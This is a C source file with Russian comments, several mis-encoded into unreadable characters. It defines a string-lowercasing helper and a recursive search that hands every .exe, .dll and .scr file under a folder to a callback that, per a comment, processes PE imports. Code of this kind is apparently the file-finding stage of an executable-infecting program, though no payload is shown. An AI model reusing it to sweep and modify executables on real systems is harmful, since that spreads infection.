/***************************************************************************************************************\
*																												*
*									ћќƒ”Ћ№ —ќ ¬—ѕќћќ√ј“≈Ћ№Ќџћ» ѕ≈–≈ћ≈ЌЌџћ»										*
*												(ќѕ–≈ƒ≈Ћ≈Ќ»я)													*
*																												*
*					перевод всей строки в нижний регистр, рекурсивный поиск файлов (PE)							*
*																												*
*											StrToLower, FindPE													*
*																												*
\***************************************************************************************************************/



#include "misc.h"



/***************************************************************************************************\
*	функа StrToLower; 
*	перевод всей строки в нижний регистр;
*	¬ход:
*		pStr	-	строка, которую как раз и надо обнигистрить )
*	¬ыход:
*		(+) (указатель на переданную строку)
\***************************************************************************************************/
char *StrToLower(char *pStr)
{
	int len = strlen(pStr);
	
	for(int i = 0; i < len; i++)
		pStr[i] = tolower(pStr[i]);
	
	return pStr; 
}
/***************************************************************************************************\
*	конец функи StrToLower; 	
\***************************************************************************************************/



/***************************************************************************************************\
*	‘унка FindPE; 
*	–екурсивный поиск файлов
*	¬ход:
*		pszDir	-	путь к папке(!), откуда начнем поиск файлов;
*		pszMask	-	маска поиска;
*		fnFunc	-	указатель на функцию, котора€ будет вызвана при нахождении очередного нужного 
*						файла;
*	¬ыходЏ:
*		1		-	если поиск хот€ бы состо€лс€, иначе 0 (например, хуЄвый (неправильный) путь)
*	«амметки:
*		по входным параметрам:
*			pszDir	- путь может быть, например, такой: "C:\\Games", "C:", "C:\\xuita" etc;
*			pszMask	- маска может быть, например, такой: "\\*.*"; 
*			fnFunc	- прототип функции должен быть такой: 
*				BOOL WINAPI xMyFunc(char *pStr);
*				в общем, ниже есть еще конкретный пример; 
\***************************************************************************************************/
BOOL FindPE(char *pszDir, char *pszMask, LPVOID fnFunc)
{
	static int recurs_level = 0; 
	char szPath[MAX_LEN * 2];	//здесь будет хранитс€ полный путь;
	HANDLE hFindFile;
	WIN32_FIND_DATA wfd;
	LPTSTR part; 
	typedef LPVOID (WINAPI *func)(LPVOID);	//вот еще один пример дл€ прототипа функи;	 
	func xFunc = (func)fnFunc;
	DWORD fp_len = strlen(pszDir) + 1 + strlen(pszMask) + 1 + 10;	//file path; 

	if((fp_len >= MAX_LEN) || (recurs_level > MAX_RECURS_LEVEL)) 
	{ 
		recurs_level--; 
	//	printf("\nskip dir: %s\n", pszDir); 
		return 0; 
	}
	
	strcpy(szPath, pszDir);   
	strcat(szPath, pszMask);	
	hFindFile = FindFirstFile(szPath, &wfd);	//начинаем поиск

	if(hFindFile != INVALID_HANDLE_VALUE)	//успешно?
	{
		GetFullPathName(szPath, MAX_LEN, szPath, &part);	//извлекает полный путь и им€ указанного файла (маски) и сохран€ем в этой же szPath; part - указатель на им€ файла/папки/маски;

		do
		{
			if((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && (wfd.cFileName[0] != '.'))	//это "нормальна€" папка?
			{
				++recurs_level; 
			//	printf("\nrecurs_level = %d\n", recurs_level); 
				strcpy(part, wfd.cFileName);	//замен€ем в полном пути маску на им€ найденной папки
				FindPE(szPath, pszMask, (LPVOID)fnFunc);	//рекурсивно заходим в эту папку;
				recurs_level--; 
			}
			else	//иначе мы нашли файл
			{
				char *pExt = (char*)&wfd.cFileName[strlen(wfd.cFileName) - 4];	//указатель на расширение файла (если оно вообще есть)
				
				if(!stricmp(pExt, ".exe") || !stricmp(pExt, ".dll") || !stricmp(pExt, ".scr"))	//если это одно из нужных нам расширений, 
				{
					strcpy(part, wfd.cFileName);	//то заменим в полном пути маску на им€ найденного файла
					
					__try
					{
						xFunc((char*)szPath);	//вызовем функу (в данном случае функу обработки импорта в PE-файле), передав ей путь к найденному файлу;
					}
					__except(EXCEPTION_EXECUTE_HANDLER)
					{
					}
				}
			}
		}while(FindNextFile(hFindFile, &wfd));	//продолжаем поиск
		
		FindClose(hFindFile);	//закрываем больше ненужный хэндл;
	}
	else return 0;	//если поиск провалилс€, вернем 0
	 
	return 1;	//иначе 1 )
}
/***************************************************************************************************\
*	конец функи FindPE; 	
\***************************************************************************************************/
